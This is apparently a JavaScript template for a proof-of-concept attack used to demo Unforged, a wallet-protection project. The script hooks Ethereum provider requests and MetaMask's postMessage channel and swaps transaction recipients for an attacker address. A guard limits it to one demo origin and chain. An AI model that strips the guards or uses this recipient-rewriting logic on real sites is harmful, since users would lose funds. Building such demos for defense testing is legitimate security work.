// Template for the demo attack payload. demo/tools/make-attacks.mjs bakes the values from
// demo/config.json (attacker address, chain id, origin) into the ALL-CAPS placeholders below
// to produce attacker/evil.js. There is no runtime fetch: the guard values are fixed here, at
// generation time.
//
// This is a proof-of-concept of the exact attack Unforged is built to block — tampered dapp
// code that rewrites a transaction's recipient before the wallet ever shows it. It is
// deliberately INERT everywhere but the demo: it rewrites `to` only when BOTH the page origin
// and the wallet's chain match the baked-in demo values. On any real site or network every
// call passes through untouched. In the demo we always REJECT the transaction in the wallet.
//
// It covers two routes a dapp uses to reach a wallet:
//   1. window.ethereum.request / EIP-6963 providers (the classic injected provider).
//   2. MetaMask's multichain channel: the dapp posts to the content script over the
//      "metamask-multichain-provider" stream (window.postMessage), carrying a nested
//      JSON-RPC request (e.g. wallet_invokeMethod -> params.request eth_sendTransaction).
//      The envelope is walked defensively; the chain comes from the request's CAIP-2 scope.
(function () {
  "use strict";
  var ATTACKER = "__ATTACKER__";
  var CHAIN_ID = __CHAIN_ID__;
  var ORIGIN = "__ORIGIN__";
  var WRAPPED = Symbol.for("unforged.demo.wrapped");

  // Half of the guard. The other half (the chain) is checked per transaction, below.
  function onDemoOrigin() {
    try {
      return window.location.origin === ORIGIN;
    } catch (e) {
      return false;
    }
  }

  // The single mutation this payload performs: point one call's recipient at the attacker
  // and log it the same way on every route. Caller has already passed both halves of the guard.
  function rewriteTo(holder) {
    if (!holder || typeof holder !== "object") return;
    var original = holder.to;
    holder.to = ATTACKER;
    console.log("[unforged demo payload] to " + original + " -> " + ATTACKER);
  }

  // Wrap one provider's `request` exactly once; a symbol marks providers we have seen.
  function wrap(provider) {
    if (!provider || typeof provider.request !== "function" || provider[WRAPPED]) {
      return provider;
    }
    var forward = provider.request.bind(provider);
    provider.request = function (args) {
      if (!args || args.method !== "eth_sendTransaction" || !onDemoOrigin()) {
        return forward(args);
      }
      // On the demo origin, ask this same provider which chain it is on before deciding.
      return Promise.resolve(forward({ method: "eth_chainId" })).then(
        function (chainIdHex) {
          if (Number(chainIdHex) === CHAIN_ID) {
            var params = args.params;
            if (Array.isArray(params)) rewriteTo(params[0]);
          }
          return forward(args);
        },
        function () {
          // Could not read the chain: stay inert and forward untouched.
          return forward(args);
        }
      );
    };
    try {
      provider[WRAPPED] = true;
    } catch (e) {
      // A frozen provider still gets the wrapped request; the mark is best-effort.
    }
    return provider;
  }

  // --- MetaMask multichain channel (window.postMessage to the content script) ---

  // Does this value, anywhere within a few levels, name the multichain provider stream? We
  // only touch messages headed for that stream; everything else passes through untouched.
  function isMultichainEnvelope(node, depth) {
    if (node === "metamask-multichain-provider") return true;
    if (!node || typeof node !== "object" || depth > 6) return false;
    for (var key in node) {
      if (!Object.prototype.hasOwnProperty.call(node, key)) continue;
      if (isMultichainEnvelope(node[key], depth + 1)) return true;
    }
    return false;
  }

  // Walk the nested envelope (several `.data` wrappers deep) to the JSON-RPC message and pull
  // out { scope, request }. Field names past this point aren't assumed: we look for any node
  // carrying a `params.request` object, descending through `.data` links.
  function findScopedRequest(node, depth) {
    if (!node || typeof node !== "object" || depth > 8) return null;
    var params = node.params;
    if (params && typeof params === "object" && params.request && typeof params.request === "object") {
      return { scope: params.scope, request: params.request };
    }
    // Keep descending: MetaMask nests the rpc message under repeated `.data` keys.
    if (node.data && typeof node.data === "object") {
      var viaData = findScopedRequest(node.data, depth + 1);
      if (viaData) return viaData;
    }
    return null;
  }

  // Chain half of the guard for this route: the CAIP-2 scope, e.g. "eip155:560048".
  function scopeMatchesChain(scope) {
    if (typeof scope !== "string") return false;
    var parts = scope.split(":");
    return parts[0] === "eip155" && Number(parts[1]) === CHAIN_ID;
  }

  // Rewrite whatever recipient(s) the nested request carries. eth_sendTransaction has one tx
  // in params[0]; wallet_sendCalls batches several calls, each with its own `to`.
  function rewriteScopedRequest(request) {
    var params = request.params;
    if (request.method === "eth_sendTransaction") {
      if (Array.isArray(params)) rewriteTo(params[0]);
    } else if (request.method === "wallet_sendCalls") {
      if (Array.isArray(params)) {
        params.forEach(function (batch) {
          if (batch && Array.isArray(batch.calls)) batch.calls.forEach(rewriteTo);
        });
      }
    }
  }

  // Inspect one outgoing postMessage and rewrite in place if it clears both guards. Mutates
  // the caller's object (MetaMask serializes it after we return), then it is forwarded as-is.
  function maybeRewriteMessage(message) {
    if (!onDemoOrigin() || !isMultichainEnvelope(message, 0)) return;
    var found = findScopedRequest(message, 0);
    if (found && scopeMatchesChain(found.scope)) rewriteScopedRequest(found.request);
  }

  // Wrap window.postMessage once. It must never throw and must forward every message.
  function wrapPostMessage() {
    if (typeof window.postMessage !== "function" || window.postMessage[WRAPPED]) return;
    var forward = window.postMessage.bind(window);
    function wrapped(message, targetOrigin, transfer) {
      try {
        maybeRewriteMessage(message);
      } catch (e) {
        // Stay inert on any unexpected shape; forward untouched.
      }
      return forward(message, targetOrigin, transfer);
    }
    try {
      wrapped[WRAPPED] = true;
    } catch (e) {
      // Best-effort mark; a non-writable function property doesn't stop the wrap.
    }
    try {
      window.postMessage = wrapped;
    } catch (e) {
      // Could not replace postMessage (frozen window): leave it as-is.
    }
  }

  if (typeof window !== "undefined") {
    if (window.ethereum) wrap(window.ethereum);
    wrapPostMessage();
    // EIP-6963: wrap every provider that announces itself, then ask them all to announce.
    window.addEventListener("eip6963:announceProvider", function (event) {
      if (event && event.detail) wrap(event.detail.provider);
    });
    try {
      window.dispatchEvent(new Event("eip6963:requestProvider"));
    } catch (e) {
      // No Event constructor (non-browser host): nothing to request.
    }
  }
})();
